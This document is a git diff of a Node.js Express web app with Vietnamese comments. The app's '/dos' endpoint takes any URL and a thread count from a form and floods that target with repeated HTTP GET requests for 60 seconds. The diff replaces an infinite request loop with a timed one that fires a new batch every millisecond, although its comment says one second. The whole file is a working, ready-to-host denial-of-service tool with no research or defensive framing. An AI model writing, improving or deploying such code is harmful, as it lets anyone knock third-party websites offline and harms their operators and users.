@@ -1,11 +1,8 @@
 const express = require('express');
 const axios = require('axios');
-const async = require('async');
 const path = require('path');
 
 const app = express();
-const port = process.env.PORT || 3000; // Railway tự động cấp cổng thông qua biến môi trường PORT
-
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
@@ -13,9 +10,10 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-app.post('/dos', async (req, res) => {
+app.post('/dos', (req, res) => {
     const url = req.body.url;
     const threads = parseInt(req.body.threads, 10);
+    const duration = 60000; // Thời gian chạy (ms), ví dụ: 60 giây
 
     if (!url.startsWith('http')) {
         return res.send('URL không hợp lệ. Vui lòng nhập URL bắt đầu bằng http:// hoặc https://');
@@ -25,26 +23,31 @@ app.post('/dos', async (req, res) => {
         return res.send('Số lượng threads không hợp lệ!');
     }
 
-    const results = [];
-    const tasks = Array.from({ length: threads }).map(() => async () => {
-        while (true) {
-            try {
-                await axios.get(url);
-                results.push('Yêu cầu đã được gửi!');
-            } catch (error) {
-                results.push('Lỗi kết nối!');
-            }
-        }
-    });
+    let isRunning = true;
 
-    async.parallel(tasks, (err) => {
-        if (err) {
-            return res.send('Đã xảy ra lỗi trong khi gửi yêu cầu.');
+    // Dừng sau thời gian đã định (60 giây)
+    setTimeout(() => {
+        isRunning = false;
+        res.send('Quá trình xử lý đã hoàn tất.');
+    }, duration);
+
+    // Khởi động các threads
+    const startAttacks = () => {
+        if (isRunning) {
+            const attackPromises = [];
+            for (let i = 0; i < threads; i++) {
+                attackPromises.push(axios.get(url).catch(() => null)); // Bắt lỗi nếu có
+            }
+            Promise.all(attackPromises).then(() => {
+                // Gửi yêu cầu xong thì đợi 1 giây và gọi lại hàm này
+                setTimeout(startAttacks, 1);
+            });
         }
-        res.send(`Quá trình xử lý đã hoàn tất. Số yêu cầu đã gửi: ${results.length}`);
-    });
+    };
+
+    startAttacks();
 });
 
-app.listen(port, () => {
-    console.log(`Server đang chạy trên http://localhost:${port}`);
+app.listen(process.env.PORT || 8080, () => {
+    console.log(`Server is running on port ${process.env.PORT || 8080}`);
 });
